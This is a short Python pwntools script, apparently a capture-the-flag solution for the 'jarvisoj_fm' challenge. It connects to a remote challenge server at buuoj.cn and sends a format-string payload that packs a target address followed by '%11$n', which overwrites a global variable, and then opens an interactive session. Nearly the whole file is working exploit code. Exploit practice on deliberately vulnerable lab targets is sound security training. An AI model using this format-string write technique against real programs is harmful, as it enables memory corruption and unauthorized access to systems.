from pwn import *

# io = process('./jarvisoj_fm')
# gdb.attach(io, 'b* 0x80485AD')
io = remote('node4.buuoj.cn', 29158)
x_address = 0x804A02C
payload = p32(x_address) + b'%11$n'
io.sendline(payload)
io.interactive()